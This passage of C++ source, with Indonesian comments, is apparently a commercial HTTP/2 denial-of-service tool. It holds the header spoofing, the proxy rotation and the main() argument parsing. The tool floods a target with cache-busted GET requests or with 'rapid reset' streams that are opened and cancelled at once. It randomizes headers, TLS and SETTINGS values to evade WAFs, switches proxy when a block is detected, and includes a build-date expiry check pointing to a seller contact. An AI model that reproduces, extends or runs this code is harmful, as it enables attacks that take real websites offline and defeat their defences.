    };
    std::string langValue = accept_langs[get_random_int(0, accept_langs.size()-1, gen)];

    if (chosen_platform == "Iphone") {
         acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"; 
    } else {
         acceptHeaderValue = isBraveRandom 
                                  ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
                                  : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
    }


    auto add_header_local = [&](const std::string& name, const std::string& value) {
        std::string randomized_name = name; 
        if (evasion_level > 0 && name.rfind(":", 0) != 0) { // Acak case hanya jika evasion aktif dan bukan pseudo-header
             randomized_name = randomize_header_case(name, gen);
        }
        conn->header_storage.push_back({randomized_name, value});
    };
    
    auto add_pseudo_header_local = [&](const std::string& name, const std::string& value) {
        conn->header_storage.push_back({name, value});
    };


    add_pseudo_header_local(":method", "GET");
    add_pseudo_header_local(":authority", conn->host);
    add_pseudo_header_local(":scheme", "https");
    add_pseudo_header_local(":path", path_for_request); 

    if (!is_rapid_reset_mode) { 
        add_header_local("cache-control", "no-store, no-cache, must-revalidate, max-age=0");
        add_header_local("pragma", "no-cache"); 
    }

    add_header_local("sec-ch-ua", secChUaBrands);
    add_header_local("sec-ch-ua-mobile", secChUaMobileValue);
    add_header_local("sec-ch-ua-platform", secChUaPlatformValue);
    if (!secChUaModelValue.empty() && secChUaModelValue != "\"\"") { 
        add_header_local("sec-ch-ua-model", secChUaModelValue);
    }
    if (!secChUaPlatformVersionValue.empty()){
         add_header_local("sec-ch-ua-platform-version", secChUaPlatformVersionValue);
    }


    add_header_local("upgrade-insecure-requests", "1");
    add_header_local("user-agent", finalUserAgent); 
    add_header_local("accept", acceptHeaderValue);

    if (isBraveRandom && (chosen_platform != "Iphone" || !custom_user_agent.empty())) { 
        add_header_local("sec-gpc", "1");
    }

    add_header_local("sec-fetch-site", "none");
    add_header_local("sec-fetch-mode", "navigate");
    add_header_local("sec-fetch-user", "?1");
    add_header_local("sec-fetch-dest", "document");
    add_header_local("accept-encoding", "gzip, deflate, br"); 
    add_header_local("accept-language", langValue);

    if (add_extra_headers_flag) {
        add_header_local("priority", "u=0, i");
        add_header_local("TE", "trailers"); 
        
        if (chosen_platform == "Windows" || chosen_platform == "Linux" || chosen_platform == "Android") {
            if (get_random_int(0,1,gen) == 1) add_header_local("sec-ch-ua-arch", "\"x86\""); 
            else add_header_local("sec-ch-ua-arch", "\"arm\""); 

            if (get_random_int(0,1,gen) == 1) add_header_local("sec-ch-ua-bitness", "\"64\"");
            else add_header_local("sec-ch_ua-bitness", "\"32\""); 
            
            if (chosen_platform == "Windows" && get_random_int(0,1,gen) == 1) { 
                 add_header_local("sec-ch-ua-wow64", "?0");
            }
        }
        if (!secChUaFullVersionList.empty()) {
             add_header_local("sec-ch-ua-full-version-list", secChUaFullVersionList);
        }
        if (chosen_platform == "Iphone" || chosen_platform == "Android") {
            add_header_local("sec-ch-ua-form-factor", "\"Mobile\"");
        } else {
            add_header_local("sec-ch-ua-form-factor", "\"Desktop\"");
        }
        
        if (!is_rapid_reset_mode && get_random_int(0, 2, gen) == 0) { 
            std::string referer_path = "/" + generate_random_string(gen, get_random_int(5,15,gen));
            add_header_local("referer", "https://" + original_target_host + referer_path);
        }
        if (get_random_int(0,3,gen) == 0) add_header_local("DNT", "1"); 
        if (get_random_int(0,2,gen) == 0) add_header_local("Sec-Purpose", "prefetch;prerender"); 
        if (get_random_int(0,2,gen) == 0) add_header_local("Viewport-Width", std::to_string(get_random_int(1024, 1920, gen)));
        if (get_random_int(0,2,gen) == 0) add_header_local("Device-Memory", std::to_string(get_random_int(4, 16, gen))); 
        if (get_random_int(0,2,gen) == 0) add_header_local("ECT", "4g"); 

        if (evasion_level > 1) { // Hanya untuk evasion level 2 (paling canggih)
            // Tambahkan header X-Padding-Evade
            add_header_local("X-Padding-Evade", generate_random_string(gen, get_random_int(10, 100, gen)));
        }
    }

    if (!custom_cookie.empty()) {
        add_header_local("cookie", custom_cookie);
    }

    if (conn->header_storage.size() > 4) { 
        auto it_pseudo_end = conn->header_storage.begin() + 4;
        std::shuffle(it_pseudo_end, conn->header_storage.end(), gen);
    }
}


// Definisi parse_proxy_string dan load_proxies_from_file dipindahkan ke sini (sebelum worker_thread_function)
bool parse_proxy_string(const std::string& proxy_str, std::string& host, uint16_t& port) {
    if (proxy_str.empty()) return false;
    size_t colon_pos = proxy_str.find(':');
    if (colon_pos == std::string::npos || colon_pos == 0 || colon_pos == proxy_str.length() - 1) {
        return false; 
    }
    host = proxy_str.substr(0, colon_pos);
    try {
        int p = std::stoi(proxy_str.substr(colon_pos + 1));
        if (p <= 0 || p > 65535) {
            return false;
        }
        port = static_cast<uint16_t>(p);
    } catch (const std::exception& e) {
        return false; 
    }
    return true;
}

std::vector<ProxyInfo> load_proxies_from_file(const std::string& filename) {
    std::vector<ProxyInfo> proxies;
    std::ifstream file(filename);
    std::string line;
    if (!file.is_open()) {
        log_error_global(-1, "Could not open proxy file: " + filename);
        return proxies; 
    }
    while (std::getline(file, line)) {
        if (line.empty() || line[0] == '#') continue; 
        ProxyInfo pi;
        if (parse_proxy_string(line, pi.host, pi.port)) {
            proxies.push_back(pi);
        } else {
            log_error_global(-1, "Skipping invalid proxy line in file " + filename + ": " + line);
        }
    }
    file.close();
    if (proxies.empty()) {
        log_info_global(-1, "Proxy file " + filename + " is empty or contains no valid proxies.");
    } else {
        log_info_global(-1, "Loaded " + std::to_string(proxies.size()) + " proxies from " + filename);
    }
    return proxies;
}


void worker_thread_function(
    std::string host_arg,
    std::string path_arg, 
    uint16_t port_arg,
    SSL_CTX *shared_ssl_ctx_template, 
    const std::vector<ProxyInfo>& all_proxies, 
    int initial_proxy_offset, 
    int rps_per_thread, 
    const std::atomic<bool>& stop_flag,
    const std::string& custom_user_agent, 
    const std::string& custom_cookie, 
    const std::string& chosen_platform_for_run, 
    bool add_extra_headers_flag, 
    bool rapid_reset_mode_enabled, 
    int evasion_level_cli, 
    const std::vector<int>& custom_waf_codes_from_main, 
    int thread_id
) {
    std::mt19937 random_gen(std::random_device{}() ^ (thread_id + 1) ^ std::chrono::system_clock::now().time_since_epoch().count());
    
    size_t current_proxy_list_idx = 0;
    if (!all_proxies.empty()) {
        current_proxy_list_idx = initial_proxy_offset % all_proxies.size();
    }
    int consecutive_proxy_failures = 0;
    const int MAX_PROXY_FAILURES_BEFORE_SWITCH = 3; 
    
    // Variabel untuk fitur evasion level 2
    int request_counter_for_evasion = 0;
    int ping_interval_rand = (evasion_level_cli >= 2) ? get_random_int(5, 15, random_gen) : 0;
    int window_update_interval_rand = (evasion_level_cli >= 2) ? get_random_int(10, 25, random_gen) : 0;


    while (!stop_flag.load(std::memory_order_relaxed)) {
        Connection conn;
        conn.host = host_arg;
        conn.path = path_arg; 
        conn.port = port_arg;
        conn.thread_id_for_logging = thread_id;
        conn.http_status_code = 0; 
        conn.waf_block_suspected.store(false, std::memory_order_relaxed);
        conn.custom_waf_codes_to_check = custom_waf_codes_from_main; 


        bool connection_is_operational = false;
        
        ProxyInfo active_proxy;
        if(!all_proxies.empty()){
            active_proxy = all_proxies[current_proxy_list_idx];
        }

        conn.sock_fd = connect_tcp(host_arg.c_str(), port_arg, active_proxy.host, active_proxy.port, thread_id);
        
        if (conn.sock_fd < 0) {
            if (!all_proxies.empty()) {
                consecutive_proxy_failures++;
                if (consecutive_proxy_failures >= MAX_PROXY_FAILURES_BEFORE_SWITCH) {
                    current_proxy_list_idx = (current_proxy_list_idx + 1) % all_proxies.size();
                    consecutive_proxy_failures = 0; 
                }
            }
            if (!stop_flag.load(std::memory_order_relaxed)) {
                std::this_thread::sleep_for(std::chrono::milliseconds(750 + get_random_int(0,750,random_gen))); 
            }
            continue;
        }
        consecutive_proxy_failures = 0;

        SSL_CTX* thread_ssl_ctx = create_ssl_context(thread_id, random_gen, evasion_level_cli > 0); 
        if (!thread_ssl_ctx) {
            log_error_global(thread_id, "Failed to create thread-specific SSL_CTX. Using shared template.");
            thread_ssl_ctx = shared_ssl_ctx_template; 
        }


        conn.ssl = SSL_new(thread_ssl_ctx); 
        if (thread_ssl_ctx != shared_ssl_ctx_template) { 
             SSL_CTX_free(thread_ssl_ctx); 
        }


        if (!conn.ssl) {
            log_error_global(thread_id, "SSL_new() failed. Error: " + std::string(ERR_reason_error_string(ERR_get_error())));
            close(conn.sock_fd); conn.sock_fd = -1;
            if (!stop_flag.load(std::memory_order_relaxed)) std::this_thread::sleep_for(std::chrono::milliseconds(500));
            continue;
        }
        SSL_set_fd(conn.ssl, conn.sock_fd);

        if (!perform_tls_handshake(&conn)) { 
            SSL_free(conn.ssl); conn.ssl = nullptr;
            close(conn.sock_fd); conn.sock_fd = -1;
            if (!stop_flag.load(std::memory_order_relaxed)) std::this_thread::sleep_for(std::chrono::milliseconds(750 + get_random_int(0,750,random_gen)));
            continue;
        }

        nghttp2_session_callbacks *callbacks;
        nghttp2_session_callbacks_new(&callbacks);
        nghttp2_session_callbacks_set_send_callback(callbacks, send_callback);
        nghttp2_session_callbacks_set_on_frame_recv_callback(callbacks, on_frame_recv_callback);
        nghttp2_session_callbacks_set_on_data_chunk_recv_callback(callbacks, on_data_chunk_recv_callback);
        nghttp2_session_callbacks_set_on_stream_close_callback(callbacks, on_stream_close_callback);
        nghttp2_session_callbacks_set_on_header_callback(callbacks, on_header_callback);

        if (nghttp2_session_client_new(&conn.session, callbacks, &conn) != 0) {
            log_error_global(thread_id, "Failed to initialize nghttp2 client session.");
            nghttp2_session_callbacks_del(callbacks);
            SSL_shutdown(conn.ssl); SSL_free(conn.ssl); conn.ssl = nullptr;
            close(conn.sock_fd); conn.sock_fd = -1;
            if (!stop_flag.load(std::memory_order_relaxed)) std::this_thread::sleep_for(std::chrono::milliseconds(500));
            continue;
        }
        nghttp2_session_callbacks_del(callbacks);

        std::vector<nghttp2_settings_entry> settings_vec;
        if (evasion_level_cli > 0) {
            settings_vec.push_back({NGHTTP2_SETTINGS_HEADER_TABLE_SIZE, (uint32_t)get_random_int(4096, 65536, random_gen)}); 
            settings_vec.push_back({NGHTTP2_SETTINGS_ENABLE_PUSH, 0});                  
            settings_vec.push_back({NGHTTP2_SETTINGS_MAX_CONCURRENT_STREAMS, (uint32_t)get_random_int(200, 500, random_gen)}); 
            settings_vec.push_back({NGHTTP2_SETTINGS_INITIAL_WINDOW_SIZE, (uint32_t)get_random_int(1048576, 15728640, random_gen)}); 
            settings_vec.push_back({NGHTTP2_SETTINGS_MAX_FRAME_SIZE, (uint32_t)get_random_int(16384, 32768, random_gen)});          
            settings_vec.push_back({NGHTTP2_SETTINGS_MAX_HEADER_LIST_SIZE, (uint32_t)get_random_int(262144, 1048576, random_gen)}); 
            settings_vec.push_back({NGHTTP2_SETTINGS_ENABLE_CONNECT_PROTOCOL, 1});      
        } else { 
            settings_vec.push_back({NGHTTP2_SETTINGS_HEADER_TABLE_SIZE, 4096});
            settings_vec.push_back({NGHTTP2_SETTINGS_ENABLE_PUSH, 0});
            settings_vec.push_back({NGHTTP2_SETTINGS_MAX_CONCURRENT_STREAMS, 256});
            settings_vec.push_back({NGHTTP2_SETTINGS_INITIAL_WINDOW_SIZE, 65535});
            settings_vec.push_back({NGHTTP2_SETTINGS_MAX_FRAME_SIZE, 16384});
            settings_vec.push_back({NGHTTP2_SETTINGS_MAX_HEADER_LIST_SIZE, 262144}); 
            settings_vec.push_back({NGHTTP2_SETTINGS_ENABLE_CONNECT_PROTOCOL, 1});
        }


        int rv_settings = nghttp2_submit_settings(conn.session, NGHTTP2_FLAG_NONE, settings_vec.data(), settings_vec.size());

        if (rv_settings != 0) {
            log_error_global(thread_id, "Could not submit nghttp2 SETTINGS: " + std::string(nghttp2_strerror(rv_settings)));
            nghttp2_session_del(conn.session); conn.session = nullptr;
            SSL_shutdown(conn.ssl); SSL_free(conn.ssl); conn.ssl = nullptr;
            close(conn.sock_fd); conn.sock_fd = -1;
            if (!stop_flag.load(std::memory_order_relaxed)) std::this_thread::sleep_for(std::chrono::milliseconds(500));
            continue;
        }

        if (nghttp2_session_send(conn.session) != 0) { 
            nghttp2_session_del(conn.session); conn.session = nullptr;
            SSL_shutdown(conn.ssl); SSL_free(conn.ssl); conn.ssl = nullptr;
            close(conn.sock_fd); conn.sock_fd = -1;
            if (!stop_flag.load(std::memory_order_relaxed)) std::this_thread::sleep_for(std::chrono::milliseconds(500));
            continue;
        }
        connection_is_operational = true;
        request_counter_for_evasion = 0; // Reset counter untuk koneksi baru

        if (rapid_reset_mode_enabled) {
            while (connection_is_operational && !stop_flag.load(std::memory_order_relaxed)) {
                std::string rr_path_variant = conn.path; 
                if (rr_path_variant.empty() || rr_path_variant.back() != '/') { 
                    rr_path_variant += "/";
                }
                rr_path_variant += generate_random_string(random_gen, get_random_int(5, 12, random_gen)); 

                prepare_headers(&conn, random_gen, custom_user_agent, custom_cookie, chosen_platform_for_run, add_extra_headers_flag, true, rr_path_variant, host_arg, evasion_level_cli);
                
                std::vector<nghttp2_nv> nva_rr;
                nva_rr.reserve(conn.header_storage.size());
                for(const auto& p : conn.header_storage) {
                    nva_rr.push_back({(uint8_t*)p.first.c_str(), (uint8_t*)p.second.c_str(), p.first.length(), p.second.length(), NGHTTP2_NV_FLAG_NONE});
                }

                int32_t stream_id_rr = nghttp2_submit_request(conn.session, nullptr, nva_rr.data(), nva_rr.size(), nullptr, &conn);

                if (stream_id_rr < 0) {
                    connection_is_operational = false; 
                    break; 
                }

                int rv_rst = nghttp2_submit_rst_stream(conn.session, NGHTTP2_FLAG_NONE, stream_id_rr, NGHTTP2_CANCEL);
                if (rv_rst != 0) {
                    connection_is_operational = false;
                    break;
                }
                
                if (add_extra_headers_flag && get_random_int(0,1,random_gen) == 0) { 
                     nghttp2_priority_spec pri_spec;
                     int weight = get_random_int(1, 256, random_gen); 
                     int dep_stream_id = 0; 
                     int exclusive = get_random_int(0,1,random_gen); 
                     nghttp2_priority_spec_init(&pri_spec, dep_stream_id, weight, exclusive); 
                     nghttp2_submit_priority(conn.session, NGHTTP2_FLAG_NONE, stream_id_rr, &pri_spec);
                }
                
                if (nghttp2_session_want_write(conn.session)) {
                    if (nghttp2_session_send(conn.session) != 0) {
                        connection_is_operational = false;
                        break; 
                    }
                }

                if (!connection_is_operational || stop_flag.load(std::memory_order_relaxed)) break;

                if (nghttp2_session_want_read(conn.session)) {
                    fd_set readfds; FD_ZERO(&readfds); FD_SET(conn.sock_fd, &readfds);
                    struct timeval tv_rr_select; tv_rr_select.tv_sec = 0; tv_rr_select.tv_usec = 1000; 
                    int select_rv = select(conn.sock_fd + 1, &readfds, nullptr, nullptr, &tv_rr_select);
                    if (select_rv > 0 && FD_ISSET(conn.sock_fd, &readfds)) {
                        char buf[16384];
                        ERR_clear_error();
                        int bytes_read = SSL_read(conn.ssl, buf, sizeof(buf));
                        if (bytes_read <= 0) { 
                            connection_is_operational = false; break;
                        }
                        if (nghttp2_session_mem_recv(conn.session, (const uint8_t *)buf, bytes_read) < 0) {
                            connection_is_operational = false; break;
                        }
                    } else if (select_rv < 0) {
                        connection_is_operational = false; break;
                    }
                }
                 if (conn.waf_block_suspected.load(std::memory_order_relaxed)) {
                    log_info_global(thread_id, "Rapid Reset: WAF-like response (HTTP " + std::to_string(conn.http_status_code) + ") detected. Forcing connection reset.");
                    connection_is_operational = false;
                    conn.waf_block_suspected.store(false, std::memory_order_relaxed); 
                    if (!all_proxies.empty()) {
                        current_proxy_list_idx = (current_proxy_list_idx + 1) % all_proxies.size();
                        consecutive_proxy_failures = 0; 
                    }
                    break; 
                }
                if (evasion_level_cli > 0 && !stop_flag.load(std::memory_order_relaxed)) { 
                    std::this_thread::sleep_for(std::chrono::milliseconds(get_random_int(5, 50, random_gen))); // Jeda lebih pendek untuk rapid reset
                }

            } 

        } else { 
            while (connection_is_operational && !stop_flag.load(std::memory_order_relaxed)) {
                conn.stream_closed.store(false, std::memory_order_relaxed);
                conn.http_status_code = 0; 
                conn.waf_block_suspected.store(false, std::memory_order_relaxed);
                
                std::string path_for_get = conn.path;
                std::string cache_buster_param = "_cb=" + generate_random_string(random_gen, 15); 
                if (path_for_get.find('?') == std::string::npos) {
                    path_for_get += "?" + cache_buster_param;
                } else {
                    path_for_get += "&" + cache_buster_param;
                }
                prepare_headers(&conn, random_gen, custom_user_agent, custom_cookie, chosen_platform_for_run, add_extra_headers_flag, false, path_for_get, host_arg, evasion_level_cli); 
                
                std::vector<nghttp2_nv> nva_get;
                nva_get.reserve(conn.header_storage.size());
                for(const auto& p : conn.header_storage) {
                    nva_get.push_back({(uint8_t*)p.first.c_str(), (uint8_t*)p.second.c_str(), p.first.length(), p.second.length(), NGHTTP2_NV_FLAG_NONE});
                }
                conn.stream_id = nghttp2_submit_request(conn.session, nullptr, nva_get.data(), nva_get.size(), nullptr, &conn);


                if (conn.stream_id < 0) {
                    connection_is_operational = false;
                    break;
                }

                while (conn.session &&
                    (nghttp2_session_want_read(conn.session) || nghttp2_session_want_write(conn.session)) &&
                    !conn.stream_closed.load(std::memory_order_relaxed) &&
                    !stop_flag.load(std::memory_order_relaxed) &&
                    connection_is_operational &&
                    !conn.waf_block_suspected.load(std::memory_order_relaxed) ) { 

                    fd_set readfds, writefds, exceptfds;
                    FD_ZERO(&readfds); FD_ZERO(&writefds); FD_ZERO(&exceptfds);
                    FD_SET(conn.sock_fd, &exceptfds);

                    struct timeval tv; tv.tv_sec = 0; tv.tv_usec = 100000; 

                    bool want_read = nghttp2_session_want_read(conn.session);
                    bool want_write = nghttp2_session_want_write(conn.session);

                    if (want_read) FD_SET(conn.sock_fd, &readfds);
                    if (want_write) FD_SET(conn.sock_fd, &writefds);

                    int select_rv = select(conn.sock_fd + 1, &readfds, &writefds, &exceptfds, &tv);

                    if (select_rv < 0 || FD_ISSET(conn.sock_fd, &exceptfds)) { 
                        connection_is_operational = false; break;
                    }

                    if (select_rv > 0) { 
                        if (FD_ISSET(conn.sock_fd, &writefds) && want_write) {
                            if (nghttp2_session_send(conn.session) != 0) {
                                connection_is_operational = false; break;
                            }
                        }
                        if (!connection_is_operational || stop_flag.load(std::memory_order_relaxed) || conn.stream_closed.load(std::memory_order_relaxed)) break;
                        if (FD_ISSET(conn.sock_fd, &readfds) && want_read) {
                            char buf[16384]; 
                            ERR_clear_error();
                            int bytes_read = SSL_read(conn.ssl, buf, sizeof(buf));
                            if (bytes_read <= 0) {
                                connection_is_operational = false; break;
                            }
                            if (nghttp2_session_mem_recv(conn.session, (const uint8_t *)buf, bytes_read) < 0) {
                                connection_is_operational = false; break;
                            }
                        }
                    }
                    if (conn.stream_closed.load(std::memory_order_relaxed) && conn.session && !nghttp2_session_want_write(conn.session)) {
                        break;
                    }
                } 
                
                if (conn.waf_block_suspected.load(std::memory_order_relaxed)) {
                    log_info_global(thread_id, "GET Mode: WAF-like response (HTTP " + std::to_string(conn.http_status_code) + ") detected. Forcing connection reset.");
                    connection_is_operational = false; 
                    conn.waf_block_suspected.store(false, std::memory_order_relaxed); 
                    if (!all_proxies.empty()) {
                        current_proxy_list_idx = (current_proxy_list_idx + 1) % all_proxies.size();
                        consecutive_proxy_failures = 0; 
                    }
                }


                if (!connection_is_operational) {
                    if (!all_proxies.empty()) { 
                        current_proxy_list_idx = (current_proxy_list_idx + 1) % all_proxies.size();
                        consecutive_proxy_failures = 0; 
                    }
                    break; 
                }
                if (stop_flag.load(std::memory_order_relaxed)) break;
                
                if (evasion_level_cli > 0 && !stop_flag.load(std::memory_order_relaxed)) { 
                    std::this_thread::sleep_for(std::chrono::milliseconds(get_random_int(10, 150, random_gen)));
                }
                
                request_counter_for_evasion++;
                if (evasion_level_cli >= 2 && connection_is_operational && !stop_flag.load(std::memory_order_relaxed)) {
                    if (ping_interval_rand > 0 && request_counter_for_evasion % ping_interval_rand == 0) {
                        uint8_t ping_payload[8];
                        for(int k=0; k<8; ++k) ping_payload[k] = get_random_int(0,255,random_gen);
                        nghttp2_submit_ping(conn.session, NGHTTP2_FLAG_NONE, ping_payload);
                        // log_info_global(thread_id, "Evasion: Sent PING frame.");
                    }
                    if (window_update_interval_rand > 0 && request_counter_for_evasion % window_update_interval_rand == 0) {
                        uint32_t new_window = (uint32_t)get_random_int(1048576, 15728640, random_gen); // 1MB - 15MB
                        nghttp2_session_set_local_window_size(conn.session, NGHTTP2_FLAG_NONE, 0, new_window);
                        // log_info_global(thread_id, "Evasion: Set new connection window size: " + std::to_string(new_window));
                    }
                     if (nghttp2_session_want_write(conn.session)) { // Kirim frame PING atau WINDOW_UPDATE jika ada
                        if (nghttp2_session_send(conn.session) != 0) {
                            connection_is_operational = false;
                        }
                    }
                }


            } 
        } 


        if (conn.session) {
            nghttp2_session_del(conn.session);
            conn.session = nullptr;
        }
        if (conn.ssl) {
            SSL_shutdown(conn.ssl);
            SSL_free(conn.ssl);
            conn.ssl = nullptr;
        }
        if (conn.sock_fd >= 0) {
            close(conn.sock_fd);
            conn.sock_fd = -1;
        }

        if (stop_flag.load(std::memory_order_relaxed)) {
            break;
        }
    }
}

bool isExpired(int daysValid) {
    std::tm buildTime = {};
    std::istringstream ss(__DATE__);
    ss >> std::get_time(&buildTime, "%b %d %Y");

    time_t now = time(0);
    time_t build = mktime(&buildTime);

    double diffDays = difftime(now, build) / (60 * 60 * 24);
    return diffDays > daysValid;
}

int main(int argc, char **argv) {
    std::string url_str_arg;
    std::string num_threads_str_arg;
    std::string rps_per_thread_ignored_str_arg;
    std::string duration_seconds_str_arg;
    std::string custom_user_agent; 
    std::string custom_cookie; 
    std::string cli_specified_platform; 
    std::string chosen_platform_for_run; 
    bool add_extra_headers_cli = false; 
    std::string proxy_cli_arg_value; 
    std::vector<ProxyInfo> proxies_list;
    bool rapid_reset_cli = false; 
    int evasion_level_cli = 0;
    std::string custom_waf_codes_str;


    std::vector<std::string> positional_args;

    if (isExpired(3)) {
        std::cout << "Expired pm @mscjs.\n";
        return 1;
    }
    
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-ua") {
            if (i + 1 < argc) { custom_user_agent = argv[++i]; } 
            else { std::cerr << "Error: Opsi -ua membutuhkan sebuah nilai." << std::endl; return 1; }
        } else if (arg == "--cookie") {
            if (i + 1 < argc) { custom_cookie = argv[++i]; }
            else { std::cerr << "Error: Opsi --cookie membutuhkan sebuah nilai." << std::endl; return 1; }
        } else if (arg == "--platform") {
            if (i + 1 < argc) { 
                cli_specified_platform = argv[++i]; 
                if (cli_specified_platform != "Linux" && cli_specified_platform != "Windows" && cli_specified_platform != "Iphone" && cli_specified_platform != "Android") {
                    std::cerr << "Error: Nilai tidak valid untuk --platform. Gunakan Linux, Windows, Iphone, atau Android." << std::endl; return 1;
                }
            } else { std::cerr << "Error: Opsi --platform membutuhkan sebuah nilai." << std::endl; return 1; }
        } else if (arg == "--extra") {
            add_extra_headers_cli = true; 
        } else if (arg == "--ip") {
            if (i + 1 < argc) { proxy_cli_arg_value = argv[++i]; }
            else { std::cerr << "Error: Opsi --ip membutuhkan sebuah nilai (host:port atau file.txt)." << std::endl; return 1;}
        } else if (arg == "--rapidreset") { 
            if (i + 1 < argc) {
                std::string val = argv[++i];
                if (val == "true") rapid_reset_cli = true;
                else if (val == "false") rapid_reset_cli = false;
                else { std::cerr << "Error: Nilai tidak valid untuk --rapidreset. Gunakan true atau false." << std::endl; return 1;}
            } else {std::cerr << "Error: Opsi --rapidreset membutuhkan sebuah nilai (true atau false)." << std::endl; return 1;}
        } else if (arg == "--evasion-level") { 
             if (i + 1 < argc) {
                try {
                    evasion_level_cli = std::stoi(argv[++i]);
                    if (evasion_level_cli < 0 || evasion_level_cli > 2) {
                         std::cerr << "Error: Nilai tidak valid untuk --evasion-level. Gunakan 0, 1, atau 2." << std::endl; return 1;
                    }
                } catch (const std::exception& e) {
                    std::cerr << "Error: Nilai tidak valid untuk --evasion-level. Harus berupa angka (0, 1, atau 2)." << std::endl; return 1;
                }
            } else {std::cerr << "Error: Opsi --evasion-level membutuhkan sebuah nilai (0, 1, atau 2)." << std::endl; return 1;}
        } else if (arg == "--waf-codes") {
            if (i + 1 < argc) { custom_waf_codes_str = argv[++i]; }
            else { std::cerr << "Error: Opsi --waf-codes membutuhkan sebuah nilai (e.g., \"[403,429]\")." << std::endl; return 1;}
        }
        else {
            positional_args.push_back(arg);
        }
    }

    if (positional_args.size() < 4) {
        std::cerr << "Usage: " << argv[0] << " <url> <num_threads> <rps_per_thread_ignored> <duration_seconds> [-ua \"UA\"] [--cookie \"C\"] [--platform <P>] [--extra] [--ip <proxy_host:port|proxy_file.txt>] [--rapidreset <true|false>] [--evasion-level <0|1|2>] [--waf-codes \"[code1,code2]\"]" << std::endl;
        return 1;
    }

    url_str_arg = positional_args[0];
    num_threads_str_arg = positional_args[1];
    rps_per_thread_ignored_str_arg = positional_args[2];
    duration_seconds_str_arg = positional_args[3];

    int num_threads = 0;
    int rps_per_thread_ignored = 0;
    int duration_seconds = 0;

    try {
        num_threads = std::stoi(num_threads_str_arg);
        rps_per_thread_ignored = std::stoi(rps_per_thread_ignored_str_arg); 
        duration_seconds = std::stoi(duration_seconds_str_arg);
    } catch (const std::exception& e) {
        std::cerr << "Error parsing arguments: " << e.what() << std::endl;
        return 1;
    }

    if (num_threads <= 0 || duration_seconds <= 0) {
        std::cerr << "Number of threads and duration must be positive." << std::endl;
        return 1;
    }
    
    std::vector<int> parsed_waf_codes;
    if (!custom_waf_codes_str.empty()) {
        parsed_waf_codes = parse_status_codes(custom_waf_codes_str);
        if (parsed_waf_codes.empty() && !custom_waf_codes_str.empty() && custom_waf_codes_str != "[]" && custom_waf_codes_str != "\"[]\"" ) { 
            log_error_global(-1, "Invalid format or no valid codes in --waf-codes: " + custom_waf_codes_str + ". Using default WAF codes.");
        }
    }


    if (!proxy_cli_arg_value.empty()) {
        if (proxy_cli_arg_value.length() > 4 && proxy_cli_arg_value.substr(proxy_cli_arg_value.length() - 4) == ".txt") {
            proxies_list = load_proxies_from_file(proxy_cli_arg_value);
            if (proxies_list.empty()) {
                log_error_global(-1, "No valid proxies loaded from file: " + proxy_cli_arg_value + ". Continuing without proxy.");
            }
        } else {
            ProxyInfo single_proxy;
            if (parse_proxy_string(proxy_cli_arg_value, single_proxy.host, single_proxy.port)) {
                proxies_list.push_back(single_proxy);
                 log_info_global(-1, "Using single proxy: " + single_proxy.host + ":" + std::to_string(single_proxy.port));
            } else {
                log_error_global(-1, "Invalid single proxy format: " + proxy_cli_arg_value + ". Continuing without proxy.");
            }
        }
    }


    if (!cli_specified_platform.empty()) {
        chosen_platform_for_run = cli_specified_platform;
    } else {
        std::vector<std::string> available_platforms = {"Linux", "Windows", "Iphone", "Android"}; 
        std::mt19937 platform_gen(std::random_device{}() ^ std::chrono::system_clock::now().time_since_epoch().count()); 
        chosen_platform_for_run = available_platforms[get_random_int(0, available_platforms.size() - 1, platform_gen)];
    }

    std::string parsed_host, parsed_path;
    uint16_t parsed_port = 443; 

    if (url_str_arg.rfind("https://", 0) == 0) {
        url_str_arg = url_str_arg.substr(8);
    } else {
        std::cerr << "URL must start with https://" << std::endl;
        return 1;
    }

    size_t path_pos = url_str_arg.find('/');
    if (path_pos != std::string::npos) {
        parsed_host = url_str_arg.substr(0, path_pos);
        parsed_path = url_str_arg.substr(path_pos); 
        if (parsed_path.empty()) parsed_path = "/";
    } else {
        parsed_host = url_str_arg;
        parsed_path = "/";
    }

    size_t port_pos_url = parsed_host.find(':'); 
    if (port_pos_url != std::string::npos) {
        try {
            parsed_port = std::stoi(parsed_host.substr(port_pos_url + 1));
        } catch (const std::exception& e) {
            std::cerr << "Invalid port number in URL: " << e.what() << std::endl;
            return 1;
        }
        parsed_host = parsed_host.substr(0, port_pos_url);
    }

    init_openssl();
    std::mt19937 main_gen(std::random_device{}()); 
    SSL_CTX *shared_ssl_ctx = create_ssl_context(-1, main_gen, evasion_level_cli > 0); // Gunakan evasion_mode_cli untuk SSL_CTX bersama jika diperlukan
    if (!shared_ssl_ctx) {
        log_error_global(-1, "Failed to create shared SSL Context. Exiting.");
        cleanup_openssl();
        return 1;
    }

    log_info_global(-1, "Starting " + std::to_string(num_threads) + " threads. Target: As fast as possible (event-driven I/O).");
    log_info_global(-1, "Duration: " + std::to_string(duration_seconds) + "s");
    log_info_global(-1, "Target URL: https://" + parsed_host + ":" + std::to_string(parsed_port) + parsed_path);
    if (rapid_reset_cli) {
        log_info_global(-1, "Rapid Reset Mode: Enabled");
    }
    log_info_global(-1, "Evasion Level: " + std::to_string(evasion_level_cli));


    if (!proxies_list.empty()) {
        if (proxy_cli_arg_value.length() > 4 && proxy_cli_arg_value.substr(proxy_cli_arg_value.length() - 4) == ".txt") {
             log_info_global(-1, "Using proxies from file: " + proxy_cli_arg_value + " (" + std::to_string(proxies_list.size()) + " loaded)");
        } else if (proxies_list.size() == 1) {
             log_info_global(-1, "Using single proxy: " + proxies_list[0].host + ":" + std::to_string(proxies_list[0].port));
        }
    } else if (!proxy_cli_arg_value.empty()){
         log_info_global(-1, "No valid proxies specified or loaded. Connecting directly.");
    }


    if (!custom_user_agent.empty()) {
        log_info_global(-1, "Custom User-Agent: " + custom_user_agent);
    } else {
        log_info_global(-1, "User-Agent: Generated based on platform");
    }
    if (!custom_cookie.empty()) {
        log_info_global(-1, "Custom Cookie: " + custom_cookie);
    } else {
        log_info_global(-1, "Cookie: None");
    }
    if (!cli_specified_platform.empty()) {
        log_info_global(-1, "Platform: " + chosen_platform_for_run + " (Specified by user)");
    } else {
        log_info_global(-1, "Platform: " + chosen_platform_for_run + " (Randomly Selected)");
    }
